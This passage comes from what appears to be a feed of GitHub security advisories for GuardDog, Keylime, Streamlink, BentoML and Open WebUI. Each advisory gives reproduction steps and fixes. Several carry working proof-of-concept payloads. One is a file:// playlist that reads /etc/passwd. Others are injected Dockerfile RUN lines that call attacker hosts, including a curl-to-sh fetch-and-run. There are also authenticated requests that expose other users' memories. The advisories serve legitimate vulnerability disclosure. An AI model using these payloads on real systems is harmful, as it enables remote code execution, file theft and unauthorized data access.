<pre><code class="language-text">http://github@127.0.0.1:18081/owner/repo
</code></pre>
<p>is transformed into:</p>
<pre><code class="language-text">http://raw.githubusercontent@127.0.0.1:18081/owner/repo/main/requirements.txt
</code></pre>
<p>Requests interprets this as an HTTP request to <code>127.0.0.1:18081</code>, and GuardDog includes the configured GitHub credentials via HTTP Basic Auth.</p>
<h1 id="reproduction-summary">Reproduction summary</h1>
<ol>
<li>Start an HTTP listener on <code>127.0.0.1:18081</code> that logs the request path and <code>Authorization</code> header.</li>
<li>Set <code>GIT_USERNAME=alice</code> and <code>GH_TOKEN=supersecret</code>.</li>
<li>Call <code>PypiRequirementsScanner().scan_remote("http://github@127.0.0.1:18081/owner/repo", "main", "requirements.txt")</code>.</li>
<li>Observe a request to <code>/owner/repo/main/requirements.txt</code> with <code>Authorization: Basic YWxpY2U6c3VwZXJzZWNyZXQ=</code>.</li>
</ol>
<h1 id="key-code-paths">Key code paths</h1>
<ul>
<li><code>guarddog/scanners/scanner.py:361-365</code></li>
</ul>
<h1 id="practical-impact">Practical impact</h1>
<p>This can expose repository-scanning infrastructure to:</p>
<ul>
<li>theft of the GitHub PAT configured in <code>GH_TOKEN</code></li>
<li>SSRF to internal or localhost services reachable by the scanner</li>
<li>attacker-controlled dependency file content returned by the malicious endpoint</li>
</ul>
<h1 id="prior-public-disclosure-check">Prior public disclosure check</h1>
<p>As of 2026-03-18, no matching public GitHub advisory, CVE, or public repo issue was found for this specific bug.</p>
<h1 id="suggested-fix">Suggested fix</h1>
<p>Parse the input URL, require <code>hostname == "github.com"</code>, validate the path shape (<code>owner/repo</code>), build the raw URL from parsed components instead of string replacement, and never send GitHub credentials to non-GitHub hosts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/DataDog/guarddog/security/advisories/GHSA-587r-mc96-6f2p">https://github.com/DataDog/guarddog/security/advisories/GHSA-587r-mc96-6f2p</a></li>
<li><a href="https://github.com/advisories/GHSA-587r-mc96-6f2p">https://github.com/advisories/GHSA-587r-mc96-6f2p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-587r-mc96-6f2p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T14:45:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[guarddog] GuardDog: Unsanitized human-readable scan output allows terminal escape injection from malicious package content]]></title>
        <id>https://github.com/advisories/GHSA-m5p4-gvpx-4mvr</id>
        <link href="https://github.com/advisories/GHSA-m5p4-gvpx-4mvr"/>
        <updated>2026-05-11T14:43:45.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>GuardDog includes attacker-controlled filenames, file locations, messages, and code snippets in its default human-readable output without escaping terminal control characters. A malicious package can therefore inject ANSI or OSC escape sequences into analyst terminals or CI logs.</p>
<h1 id="description">Description</h1>
<p>The finding formatter stores file paths and snippets from scanned content:</p>
<pre><code class="language-python">location = file_path + ":" + str(start_line)
finding = {
    "location": location,
    "code": code,
    "message": result["extra"]["message"],
}
</code></pre>
<p>The human-readable reporter later prints these values directly:</p>
<pre><code class="language-python">"  * " + finding["message"] + " at " + finding["location"] + "\n    " + _format_code_line_for_output(finding["code"])
</code></pre>
<p>No escaping is applied for control characters such as <code>\x1b</code>. A malicious package can therefore ship a filename like:</p>
<pre><code class="language-text">evil\x1b[2J.py
</code></pre>
<p>or matched source lines containing terminal escapes, which survive into the final CLI output.</p>
<h1 id="reproduction-summary">Reproduction summary</h1>
<ol>
<li>Create a file whose name contains <code>\x1b[2J</code>.</li>
<li>Feed a semgrep-style result referencing that file into <code>Analyzer._format_semgrep_response()</code>.</li>
<li>Render the result with <code>HumanReadableReporter.print_scan_results()</code>.</li>
<li>The output string contains the raw escape bytes, which a terminal may interpret.</li>
</ol>
<h1 id="key-code-paths">Key code paths</h1>
<ul>
<li><code>guarddog/analyzer/analyzer.py:377-392</code></li>
<li><code>guarddog/reporters/human_readable.py:36-42</code></li>
<li><code>guarddog/reporters/human_readable.py:84-91</code></li>
</ul>
<h1 id="practical-impact">Practical impact</h1>
<p>This can be used to:</p>
<ul>
<li>clear or rewrite analyst terminal output</li>
<li>inject misleading or spoofed log content in CI</li>
<li>emit clickable OSC 8 hyperlinks or title changes in compatible terminals</li>
</ul>
<h1 id="prior-public-disclosure-check">Prior public disclosure check</h1>
<p>As of 2026-03-18, no matching public GitHub advisory, CVE, or public repo issue was found for this specific bug.</p>
<h1 id="suggested-fix">Suggested fix</h1>
<p>Escape or strip terminal control characters before rendering any attacker-controlled value in human-readable output. This should cover package names, file paths, messages, and code snippets.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/DataDog/guarddog/security/advisories/GHSA-m5p4-gvpx-4mvr">https://github.com/DataDog/guarddog/security/advisories/GHSA-m5p4-gvpx-4mvr</a></li>
<li><a href="https://github.com/advisories/GHSA-m5p4-gvpx-4mvr">https://github.com/advisories/GHSA-m5p4-gvpx-4mvr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5p4-gvpx-4mvr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-11T14:43:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keylime] Keylime has a hardcoded attestation challenge nonce that allows replay attacks]]></title>
        <id>https://github.com/advisories/GHSA-q8w6-w55c-ccv5</id>
        <link href="https://github.com/advisories/GHSA-q8w6-w55c-ccv5"/>
        <updated>2026-05-11T14:42:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="cve-2026-6420-hardcoded-attestation-challenge-nonce-allows-replay-attacks">CVE-2026-6420: Hardcoded attestation challenge nonce allows replay attacks</h2>
<h3 id="impact">Impact</h3>
<p>The <code>CertificationParameters.generate_challenge()</code> method in the push attestation protocol uses a hardcoded challenge nonce instead of generating a cryptographically random value. This removes the nonce-based replay protection from TPM quote attestation.</p>
<p>An attacker with root access on a monitored agent node can exploit this by stockpiling valid TPM quotes (using <code>tpm2_quote</code> with the known nonce) before compromising the system, then replaying them to evade detection by the verifier. The push attestation timeout (~10s) constrains the generation window, but TPM throughput allows stockpiling ~50-200 quotes, enabling approximately 8-33 minutes of undetected compromise with default settings.</p>
<p>The attack is limited to a single agent node (AK signature binding prevents cross-agent replay). The pull-mode (legacy) attestation path is not affected.</p>
<p><strong>Affected versions:</strong> &gt;= 7.14.0, &lt;= 7.14.1</p>
<p><strong>CVSS:</strong> 6.3 Medium (<code>CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L</code>)</p>
<table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
<th>Rationale</th>
</tr>
</thead>
<tbody><tr>
<td>AV</td>
<td>Local</td>
<td>Exploitation requires local access to the agent machine (stop agent, access TPM, run replacement). The network transmission of quotes to the verifier is normal protocol operation.</td>
</tr>
<tr>
<td>AC</td>
<td>Low</td>
<td>Deterministic attack: publicly visible nonce, standard <code>tpm2-tools</code>, no race conditions.</td>
</tr>
<tr>
<td>PR</td>
<td>High</td>
<td>Root on a legitimate enrolled node is required. The vulnerability does not help gain access -- it only helps evade detection after root is obtained. No value against a machine the attacker already controls.</td>
</tr>
<tr>
<td>UI</td>
<td>None</td>
<td>Fully automated after initial setup.</td>
</tr>
<tr>
<td>S</td>
<td>Unchanged</td>
<td>AK signature binding confines impact to the single compromised agent.</td>
</tr>
<tr>
<td>C</td>
<td>High</td>
<td>Compromised node continues receiving bootstrap keys, payloads, and secrets intended for trusted nodes.</td>
</tr>
<tr>
<td>I</td>
<td>High</td>
<td>Verifier cannot distinguish a healthy system from a fully compromised one during the evasion window.</td>
</tr>
<tr>
<td>A</td>
<td>Low</td>
<td>Only the compromised agent's revocation and incident response are suppressed; the system as a whole remains operational.</td>
</tr>
</tbody></table>
<p>The base score does not fully capture the operational severity: Keylime exists to detect machine compromise, so 8-33 minutes of undetected compromise is operationally critical. The fix is a one-line change and should be applied immediately regardless of the base score.</p>
<h3 id="patches">Patches</h3>
<p>The fix restores the original random nonce generation (one-line change in <code>keylime/models/verifier/evidence.py</code>):</p>
<pre><code class="language-python"># Before (vulnerable):
def generate_challenge(self, bit_length):
    # self.challenge = Nonce.generate(bit_length)
    self.challenge = bytes.fromhex("49beed365aac777dae23564f5ad0ec")

# After (fixed):
def generate_challenge(self, bit_length):
    self.challenge = Nonce.generate(bit_length)
</code></pre>
<p>Users should upgrade to the version containing this fix (7.14.2).</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no complete workaround. The following existing mechanisms provide partial mitigation and are already active by default (no configuration needed):</p>
<ol>
<li><strong>TPM clock monotonicity check</strong> limits each distinct stockpiled quote to a single use, bounding the total evasion time.</li>
<li><strong>Push attestation timeout</strong> (default 10s) prevents the attacker from going silent and constrains the quote generation window.</li>
</ol>
<p>Reducing <code>quote_interval</code> increases the attestation frequency but does not prevent the stockpiling attack.</p>
<h3 id="references">References</h3>
<ul>
<li>CWE-329: Generation of Predictable IV/Nonce (primary -- hardcoded nonce in cryptographic attestation protocol)</li>
<li>CWE-547: Use of Hard-Coded, Security-relevant Constants (hardcoded constant left in production code)</li>
<li>CWE-294: Authentication Bypass by Capture-replay (consequence -- enables replay attacks)</li>
<li>CWE-1241: Use of Predictable Algorithm in Random Number Generator</li>
<li>Introducing commit: <a href="https://github.com/keylime/keylime/commit/2bf91197"><code>2bf91197</code></a> via <a href="https://github.com/keylime/keylime/pull/1814">PR #1814</a></li>
<li>TCG TPM 2.0 Library Specification, Part 1, Section 18.4 (TPM2_Quote)</li>
<li>IETF RATS Architecture (RFC 9334), Section 8 (Freshness)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/keylime/keylime/security/advisories/GHSA-q8w6-w55c-ccv5">https://github.com/keylime/keylime/security/advisories/GHSA-q8w6-w55c-ccv5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6420">https://nvd.nist.gov/vuln/detail/CVE-2026-6420</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-6420">https://access.redhat.com/security/cve/CVE-2026-6420</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2458889">https://bugzilla.redhat.com/show_bug.cgi?id=2458889</a></li>
<li><a href="https://github.com/advisories/GHSA-q8w6-w55c-ccv5">https://github.com/advisories/GHSA-q8w6-w55c-ccv5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8w6-w55c-ccv5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-11T14:42:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[streamlink] Streamlink has an arbitrary local file read via file:// URI in HLS and DASH]]></title>
        <id>https://github.com/advisories/GHSA-hgqw-6m45-hw5f</id>
        <link href="https://github.com/advisories/GHSA-hgqw-6m45-hw5f"/>
        <updated>2026-05-11T14:28:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Streamlink's HLS and DASH parsers do not validate the URI scheme of segment entries and other resources. A remote <code>.m3u8</code> HLS playlist or <code>.mpd</code> DASH manifest can list <code>file:///path/to/file</code> as a segment, and streamlink will read that local file and write its contents to the output stream.</p>
<p>Confirmed on streamlink 8.3.0 (latest release at time of report).</p>
<h2 id="description">Description</h2>
<p>Segment URIs from an HLS playlist or DASH manifest are passed to the worker without any scheme check. The underlying HTTP session accepts <code>file://</code> URIs, which resolve against the local filesystem. There is no scheme allowlist at the parser level, so any path readable by the streamlink process is treated as a valid segment.</p>
<p>The attacker does not need local access to the victim. A playlist/manifest hosted on an attacker-controlled server, fetched by streamlink on the victim's machine, is enough to trigger the read.</p>
<h2 id="impact">Impact</h2>
<p>A remote attacker hosting a malicious playlist/manifest can make any client running streamlink against that URL read arbitrary local files within the streamlink process's read scope and write them into the output file.</p>
<p>Reachable files depend on the user running streamlink. Typical targets: <code>~/.ssh/id_*</code> private keys, <code>~/.aws/credentials</code>, shell history, application config files holding API tokens, and world-readable system files like <code>/etc/passwd</code>.</p>
<h3 id="affected-scenarios">Affected scenarios</h3>
<ul>
<li>Server-side or automated deployments (recording bots, media pipelines, CI jobs processing playlists). The output file is often uploaded, logged, or otherwise exposed, which gives direct disclosure to attacker-reachable locations.</li>
<li>Interactive desktop use. File contents land on the victim's disk and can leak through secondary channels: the user sharing the recording, cloud sync, backup, etc.</li>
</ul>
<p>This bug does not on its own send file contents back to the attacker. The disclosure goes to the output sink. Full exfiltration depends on what happens to that file afterward.</p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<p>Tested on streamlink 8.3.0, Linux (Kali).</p>
<ol>
<li><p>Save as <code>playlist.m3u8</code>:</p>
<pre><code class="language-m3u">#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:5
#EXT-X-PLAYLIST-TYPE:VOD
#EXTINF:5.0,
file:///etc/passwd
#EXT-X-ENDLIST
</code></pre>
</li>
<li><p>Host the playlist on a remote server reachable by the victim. For testing, a VPS, a tunnel (cloudflared, ngrok), or a static host like GitHub Pages all work.</p>
</li>
<li><p>On the victim machine:</p>
<pre><code class="language-sh">streamlink "hls://https://attacker-host.example/playlist.m3u8" best -o /tmp/proof.ts
</code></pre>
</li>
<li><p>Inspect the output:</p>
<pre><code class="language-sh">cat /tmp/proof.ts
</code></pre>
</li>
<li><p>The output contains the contents of <code>/etc/passwd</code> from the machine running streamlink.</p>
</li>
</ol>
<h3 id="local-reproduction-equivalent-simpler-to-set-up">Local reproduction (equivalent, simpler to set up):</h3>
<pre><code class="language-sh">python3 -m http.server 8080    # in directory containing playlist.m3u8
streamlink "hls://http://127.0.0.1:8080/playlist.m3u8" best -o /tmp/proof.ts
cat /tmp/proof.ts
</code></pre>
<p>The remote case was confirmed independently using a tunnel.</p>
<h2 id="proposed-remediation">Proposed remediation</h2>
<p>Allowlist http and https for segment URIs in the HLS parser. Reject any other scheme (file, ftp, data, etc.) at parse time, before the URI reaches the fetcher.</p>
<p>The check needs to cover:</p>
<ul>
<li>Segment URIs in the top-level manifest.</li>
<li>Segment URIs in nested manifests pulled during playback (variant playlists referenced from a master playlist).</li>
<li>Other URI fields the fetcher consumes — <code>#EXT-X-KEY</code> and <code>#EXT-X-MAP</code> URIs at minimum. Worth auditing the rest for the same issue.</li>
</ul>
<p>The check belongs in the parser, not the fetcher. Putting it next to the untrusted input means downstream callers don't each need to re-implement it, and any future fetcher path inherits the protection by default.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/streamlink/streamlink/security/advisories/GHSA-hgqw-6m45-hw5f">https://github.com/streamlink/streamlink/security/advisories/GHSA-hgqw-6m45-hw5f</a></li>
<li><a href="https://github.com/advisories/GHSA-hgqw-6m45-hw5f">https://github.com/advisories/GHSA-hgqw-6m45-hw5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hgqw-6m45-hw5f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-11T14:28:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bentoml] Dockerfile command injection via envs[*].name in bentofile.yaml (sibling fix-bypass of CVE-2026-33744 and CVE-2026-35043)]]></title>
        <id>https://github.com/advisories/GHSA-w2pm-x38x-jp44</id>
        <link href="https://github.com/advisories/GHSA-w2pm-x38x-jp44"/>
        <updated>2026-05-11T14:27:38.000Z</updated>
        <content type="html"><![CDATA[<h1 id="bentoml-envsname-dockerfile-command-injection--sibling-of-cve-2026-33744--cve-2026-35043">BentoML <code>envs[*].name</code> Dockerfile command injection — sibling of CVE-2026-33744 / CVE-2026-35043</h1>
<p>A malicious <code>bentofile.yaml</code> containing a newline-injected value in <code>envs[*].name</code> produces unquoted <code>RUN</code> directives in the BentoML-generated Dockerfile. When the victim runs <code>bentoml containerize</code> on the imported bento, those <code>RUN</code> directives execute on the host during <code>docker build</code>. Verified end-to-end on <code>bentoml==1.4.38</code>.</p>
<h2 id="vulnerable-code">Vulnerable code</h2>
<p><code>src/bentoml/_internal/container/frontend/dockerfile/templates/base_v2.j2:71-73</code>:</p>
<pre><code class="language-jinja">{% for env in __bento_envs__ %}
{% set stage = env.stage | default("all") -%}
{% if stage != "runtime" -%}
ARG {{ env.name }}{% if env.value %}={{ env.value | bash_quote }}{% endif %}
ENV {{ env.name }}=${{ env.name }}
{% endif -%}
{% endfor %}
</code></pre>
<p><code>env.value</code> is bash-quoted via the <code>bash_quote</code> filter, but <strong><code>env.name</code> is interpolated raw</strong> with no escaping or newline filtering. The template is rendered by <code>_bentoml_impl/docker.generate_dockerfile</code> (the v2 SDK Docker generation path used by <code>bentoml containerize</code> for modern services).</p>
<h2 id="sibling-relationship-to-existing-cves">Sibling relationship to existing CVEs</h2>
<p>The earlier patches addressed the same Dockerfile-command-injection class for a different bentofile field:</p>
<ul>
<li><strong>CVE-2026-33744 / GHSA-jfjg-vc52-wqvf</strong> (2026-03-25): added <code>bash_quote</code> to <code>system_packages</code> interpolation in Dockerfile templates and <code>images.py</code>.</li>
<li><strong>CVE-2026-35043 / GHSA-fgv4-6jr3-jgfw</strong> (2026-04-02): added <code>shlex.quote</code> to <code>system_packages</code> in the cloud deployment path (<code>_internal/cloud/deployment.py:1648</code>).</li>
</ul>
<p>Both patches limit themselves to <code>system_packages</code>. The <code>envs[*].name</code> field is the same root-cause class (<code>bentofile.yaml</code> value flowing unquoted into a Dockerfile interpretation context) but was never included in the fix scope.</p>
<h2 id="reproduction">Reproduction</h2>
<pre><code class="language-bash">pip install bentoml==1.4.38
python verify_render.py
</code></pre>
<p>Expected:</p>
<pre><code>[*] rendered Dockerfile size: 1789 bytes
[*] injected RUN lines: 3
    RUN curl -fsSL http://attacker.example.com/$(whoami)=1
    RUN curl -fsSL http://attacker.example.com/$(whoami)=$FOO
    RUN curl -fsSL http://attacker.example.com/$(whoami)
</code></pre>
<p>Each injected <code>RUN</code> line is a Dockerfile command that runs during <code>docker build</code>. With <code>$(whoami)</code> shell-substituted by Docker's RUN executor, the example payload exfiltrates the build host's username.</p>
<h2 id="threat-model">Threat model</h2>
<ol>
<li>Attacker authors a malicious bento with a crafted <code>bentofile.yaml</code>.</li>
<li>Attacker exports the bento (<code>.bento</code> or <code>.tar.gz</code>) and distributes (S3, HTTP, BentoCloud share, etc.).</li>
<li>Victim imports with <code>bentoml import bento.tar</code>; no validation of <code>envs</code> content.</li>
<li>Victim runs <code>bentoml containerize</code> to build the container image.</li>
<li>BentoML renders the Dockerfile with the attacker's <code>envs</code> values, producing injected <code>RUN</code> lines.</li>
<li><code>docker build</code> (or BuildKit) executes the injected <code>RUN</code> commands on the build host, achieving RCE in the victim's build environment.</li>
</ol>
<p>The flow mirrors CVE-2026-33744 exactly, with <code>envs</code> substituted for <code>system_packages</code>.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>In <code>base_v2.j2</code> lines 71-73, apply the <code>bash_quote</code> filter to <code>env.name</code> (and to the <code>=$VAR</code> reference in the <code>ENV</code> line, since the variable name itself is reused there):</p>
<pre><code class="language-jinja">ARG {{ env.name | bash_quote }}{% if env.value %}={{ env.value | bash_quote }}{% endif %}
ENV {{ env.name | bash_quote }}=${{ env.name | bash_quote }}
</code></pre>
<p>Better, since <code>env.name</code> is semantically a Dockerfile identifier, validate at the schema level: in <code>bentoml/_internal/bento/build_config.py:BentoEnvSchema</code>, add an <code>attr.validators.matches_re(r"^[A-Za-z_][A-Za-z0-9_]*$")</code> to the <code>name</code> field so newline / shell-metacharacter values are rejected at config load.</p>
<h2 id="affected-versions">Affected versions</h2>
<ul>
<li>bentoml 1.4.38 (verified end-to-end)</li>
<li>Likely all 1.x versions where <code>_bentoml_impl/docker.py</code> exists; the v2 SDK code path was added before the CVE-2026-33744 / CVE-2026-35043 patches and was not retroactively swept for siblings.</li>
</ul>
<h2 id="disclosure">Disclosure</h2>
<p>Requesting CVE assignment and GHSA publication. Available for additional repro under different distros / frontends, or for a PR with the suggested fix, on request.</p>
<h2 id="poc-artifacts">PoC artifacts</h2>
<p>Gated HF repo (request access): <a href="https://huggingface.co/mrw0r57/bentoml-envs-cmdinjection-poc">https://huggingface.co/mrw0r57/bentoml-envs-cmdinjection-poc</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-78f9-r8mh-4xm2">https://github.com/bentoml/BentoML/security/advisories/GHSA-78f9-r8mh-4xm2</a></li>
<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44">https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44</a></li>
<li><a href="https://github.com/advisories/GHSA-w2pm-x38x-jp44">https://github.com/advisories/GHSA-w2pm-x38x-jp44</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w2pm-x38x-jp44</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T14:27:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bentoml] BentoML Dockerfile command injection via docker.base_image (sister of pending GHSA-w2pm-x38x-jp44 / CVE-2026-33744 / CVE-2026-35043)]]></title>
        <id>https://github.com/advisories/GHSA-78f9-r8mh-4xm2</id>
        <link href="https://github.com/advisories/GHSA-78f9-r8mh-4xm2"/>
        <updated>2026-05-11T14:27:07.000Z</updated>
        <content type="html"><![CDATA[<p>The same Dockerfile template that mishandles <code>envs[*].name</code> (pending GHSA-w2pm-x38x-jp44) also interpolates <code>docker.base_image</code> raw with no escaping, newline filtering, or validation. A malicious bento.yaml with a multi-line <code>docker.base_image</code> value smuggles arbitrary Dockerfile directives into the generated Dockerfile, and <code>bentoml containerize</code> then runs <code>docker build</code> which executes the injected <code>RUN</code> directives on the victim host.</p>
<h2 id="vulnerable-code">Vulnerable code</h2>
<p><code>src/bentoml/_internal/container/frontend/dockerfile/templates/base_v2.j2:38</code> (current main, 2026-04-28):</p>
<pre><code class="language-jinja">FROM {{ __options__base_image }} AS base-container
</code></pre>
<p><code>__options__base_image</code> resolves to <code>DockerOptions.base_image</code> (<code>src/bentoml/_internal/bento/build_config.py:176</code>):</p>
<pre><code class="language-python">base_image: t.Optional[str] = None
</code></pre>
<p>No <code>validator</code>, no <code>converter</code>, no newline check. The value is loaded straight from <code>bento.yaml</code> in <code>src/bentoml/_internal/container/__init__.py:206</code> via <code>DockerOptions(**docker_attrs)</code> and rendered as-is.</p>
<h2 id="poc">PoC</h2>
<p>Malicious <code>bentofile.yaml</code>:</p>
<pre><code class="language-yaml">docker:
  base_image: |
    python:3.10
    RUN curl https://attacker.tld/x.sh | sh
    FROM scratch
</code></pre>
<p>Minimal reproduction of the unsafe interpolation:</p>
<pre><code class="language-python">from jinja2 import Environment
env = Environment()
malicious = 'python:3.10\nRUN curl https://attacker.tld/x.sh | sh\nFROM scratch'
out = env.from_string('FROM {{ __options__base_image }} AS base-container').render(__options__base_image=malicious)
print(out)
</code></pre>
<p>Output:</p>
<pre><code>FROM python:3.10
RUN curl https://attacker.tld/x.sh | sh
FROM scratch AS base-container
</code></pre>
<p>Three valid Dockerfile directives instead of one. The <code>RUN curl</code> executes during <code>docker build</code>. The trailing <code>FROM scratch AS base-container</code> provides the named build stage the rest of the template depends on, so the build proceeds without error.</p>
<h2 id="impact">Impact</h2>
<p>Identical to GHSA-w2pm-x38x-jp44: arbitrary command execution on the victim's host during <code>bentoml containerize</code> of an attacker-supplied bento. Threat model is bento sharing (registry, marketplace, supply-chain handoff). The victim expects <code>docker.base_image</code> to be a Docker image reference, not a Dockerfile fragment.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Validate <code>DockerOptions.base_image</code> at the config layer: reject any value containing newline characters (<code>\n</code>, <code>\r</code>) or whitespace beyond a single space-separated tag. A regex like <code>^[A-Za-z0-9._/-]+(:[A-Za-z0-9._-]+)?(@sha256:[a-f0-9]{64})?$</code> covers the practical Docker reference format.</p>
<p>The same hardening should be extended to other unvalidated fields interpolated raw in <code>base_v2.j2</code>:</p>
<ul>
<li><code>__options__build_include[*]</code> at line 97 (<code>COPY ... ./src/{{ name }} ./src/{{ name }}</code>) — same newline-injection class for path entries from <code>Image.build_include(*file_paths)</code>.</li>
<li><code>bento__user</code>, <code>bento__uid_gid</code>, <code>bento__path</code>, <code>bento__home</code>, <code>bento__entrypoint</code> — currently sourced from server-side defaults but should be defended in depth if they ever become user-overridable through <code>override_bento_env</code>.</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li>Pending sibling: GHSA-w2pm-x38x-jp44 (envs[*].name), itself a sibling-fix-bypass of CVE-2026-33744 / CVE-2026-35043.</li>
<li>CWE-78: <a href="https://cwe.mitre.org/data/definitions/78.html">https://cwe.mitre.org/data/definitions/78.html</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-78f9-r8mh-4xm2">https://github.com/bentoml/BentoML/security/advisories/GHSA-78f9-r8mh-4xm2</a></li>
<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44">https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44</a></li>
<li><a href="https://github.com/advisories/GHSA-78f9-r8mh-4xm2">https://github.com/advisories/GHSA-78f9-r8mh-4xm2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78f9-r8mh-4xm2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T14:27:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI has inconsistent authorization controls within memories API]]></title>
        <id>https://github.com/advisories/GHSA-hmjq-crxp-7rjw</id>
        <link href="https://github.com/advisories/GHSA-hmjq-crxp-7rjw"/>
        <updated>2026-05-11T14:25:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Authorization controls surrounding the memories API were inconsistent, resulting in the ability of a standard user to delete, restore, and view the contents of other users' memories.</p>
<h3 id="details">Details</h3>
<p>Using a newly created non-admin user with no existing memories, it is possible to view existing memories via <code>POST /api/v1/memories/query</code>. See below under the PoC section, where a call to <code>GET /api/v1/memories/</code> returns <code>[]</code> (as expected) but a call to <code>POST /api/v1/memories/query</code> reveals memories created by other users.</p>
<p>Similarly, even if a non-admin user cannot modify another user's memory data via <code>POST /api/v1/memories/{memory_id}/update</code>, the endpoint's response improperly leaks the content of that memory if a valid memory_id is known.</p>
<p>The <code>DELETE /api/v1/memories/{memory_id}</code> can also be used by any user to delete an existing memory. Deleted memories can then be restored by calling the <code>POST /api/v1/memories/{memory_id}/update</code> endpoint again.</p>
<h3 id="poc-1">PoC 1</h3>
<p><strong>Example of a user with no memories able to query an existing memory from another user</strong></p>
<pre><code>GET /api/v1/memories/ HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
Accept: application/json
Content-Type: application/json
Connection: keep-alive
Content-Length: 0

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:19:58 GMT
server: uvicorn
content-length: 2
content-type: application/json
x-process-time: 0

[]
</code></pre>
<pre><code>POST /api/v1/memories/query HTTP/1.1
Host: localhost:8080
Content-Length: 19
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
accept: application/json
Content-Type: application/json
Connection: keep-alive

{
  "content": ""
}

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:22:01 GMT
server: uvicorn
content-length: 187
content-type: application/json
x-process-time: 0
access-control-allow-origin: *
access-control-allow-credentials: true

{"ids":[["d6802d76-a50f-4255-b68e-0f60c335e043"]],"documents":[["My secret content"]],"metadatas":[[{"created_at":1752784616,"updated_at":1752864797}]],"distances":[[0.6216812525921495]]}
</code></pre>
<h3 id="poc-2">PoC 2</h3>
<p><strong>Example showing excess output about a memory a user has no access to modify</strong></p>
<pre><code>POST /api/v1/memories/d6802d76-a50f-4255-b68e-0f60c335e043/update HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
Accept: application/json
Content-Type: application/json
Connection: keep-alive
Content-Length: 23

{
  "content": ""
}

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 18:53:37 GMT
server: uvicorn
content-length: 172
content-type: application/json
x-process-time: 0

{"id":"d6802d76-a50f-4255-b68e-0f60c335e043","user_id":"a050e531-356b-4673-8772-ff1aecdf3273","content":"My secret content","updated_at":1752864797,"created_at":1752784616}
</code></pre>
<h3 id="poc-3">PoC 3</h3>
